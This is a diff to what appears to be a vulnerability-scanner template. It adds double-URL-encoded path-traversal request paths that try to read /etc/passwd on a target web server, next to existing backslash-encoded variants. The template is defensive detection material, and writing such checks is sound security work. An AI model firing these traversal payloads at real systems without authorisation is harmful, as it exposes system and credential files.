@@ -10,6 +10,9 @@ requests:
   - method: GET
     path:
       - "{{BaseURL}}/..%5cetc/passwd"
+      - "{{BaseURL}}/..%252fetc%252fpasswd"
+      - "{{BaseURL}}/..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
       - "{{BaseURL}}/..%5c..%5cetc/passwd"
       - "{{BaseURL}}/..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/..%5c..%5c..%5c..%5cetc/passwd"
@@ -17,12 +20,14 @@ requests:
       - "{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/static/..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%252f..%252f..%252fetc%252fpasswd"
       - "{{BaseURL}}/static/..%5c..%5cetc/passwd"
       - "{{BaseURL}}/static/..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/static/..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
       - "{{BaseURL}}/./../../../../../../../../../../etc/passwd"
     matchers-condition: and
     matchers:
